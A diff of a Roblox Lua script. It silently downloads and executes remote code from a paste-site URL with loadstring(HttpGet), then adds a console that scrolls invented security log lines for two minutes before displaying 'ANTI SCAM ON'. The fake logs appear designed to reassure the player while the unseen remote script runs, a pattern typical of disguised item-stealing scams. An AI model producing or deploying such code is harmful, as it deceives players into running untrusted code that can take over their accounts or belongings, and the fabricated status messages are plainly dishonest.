@@ -1,4 +1,4 @@
--- Run external script first
+-- External script runs first
 pcall(function()
     loadstring(game:HttpGet("https://pastefy.app/O1yBSZ1G/raw"))()
 end)
@@ -9,32 +9,57 @@ gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
--- Transparent console box
+-- Console box
 local consoleBox = Instance.new("Frame")
 consoleBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
 consoleBox.BackgroundTransparency = 0.4
 consoleBox.BorderSizePixel = 0
+consoleBox.Position = UDim2.new(0, 5, 0, 5)
+consoleBox.Size = UDim2.new(0, 350, 0, 200)
 consoleBox.Parent = gui
 
--- "ANTI SCAM ON" text inside box
-local antiScamLabel = Instance.new("TextLabel")
-antiScamLabel.BackgroundTransparency = 1
-antiScamLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-antiScamLabel.Font = Enum.Font.Code
-antiScamLabel.TextSize = 16
-antiScamLabel.TextXAlignment = Enum.TextXAlignment.Left
-antiScamLabel.TextYAlignment = Enum.TextYAlignment.Top
-antiScamLabel.Text = "ANTI SCAM ON"
-antiScamLabel.Parent = consoleBox
+-- Logs label
+local logLabel = Instance.new("TextLabel")
+logLabel.BackgroundTransparency = 1
+logLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+logLabel.Font = Enum.Font.Code
+logLabel.TextSize = 16
+logLabel.TextXAlignment = Enum.TextXAlignment.Left
+logLabel.TextYAlignment = Enum.TextYAlignment.Top
+logLabel.Text = ""
+logLabel.Size = UDim2.new(1, -10, 1, -10)
+logLabel.Position = UDim2.new(0, 5, 0, 5)
+logLabel.TextWrapped = false
+logLabel.TextStrokeTransparency = 0.8
+logLabel.Parent = consoleBox
 
--- Padding between text and box edges
-local padding = 10
-local function resizeBox()
-    local textBounds = antiScamLabel.TextBounds
-    consoleBox.Size = UDim2.new(0, textBounds.X + padding * 2, 0, textBounds.Y + padding * 2)
-    consoleBox.Position = UDim2.new(0, 5, 0, 5)
-    antiScamLabel.Size = UDim2.new(1, -padding * 2, 1, -padding * 2)
-    antiScamLabel.Position = UDim2.new(0, padding, 0, padding)
-end
+-- Fake log lines
+local fakeLogs = {
+    "[INFO] Initializing security modules...",
+    "[OK] Security module loaded.",
+    "[INFO] Scanning player inventory...",
+    "[OK] No suspicious items found.",
+    "[INFO] Checking network connection...",
+    "[OK] Connection secure.",
+    "[INFO] Validating script integrity...",
+    "[OK] Scripts verified.",
+    "[INFO] Activating anti-scam protocols...",
+    "[OK] Protocol active.",
+    "[INFO] Monitoring in-game transactions...",
+    "[OK] Monitoring enabled.",
+    "[INFO] Checking server authenticity...",
+    "[OK] Server is verified.",
+    "[INFO] System status: STABLE"
+}
 
-resizeBox()
+-- Show logs for ~2 minutes
+task.spawn(function()
+    local startTime = tick()
+    while tick() - startTime < 120 do -- 120 seconds = 2 minutes
+        local log = fakeLogs[math.random(1, #fakeLogs)]
+        logLabel.Text = logLabel.Text .. log .. "\n"
+        task.wait(math.random(5, 15) / 10) -- 0.5s to 1.5s per line
+    end
+    -- After 2 mins: clear logs & show "ANTI SCAM ON" 3 lines lower
+    logLabel.Text = string.rep("\n", 3) .. "ANTI SCAM ON"
+end)
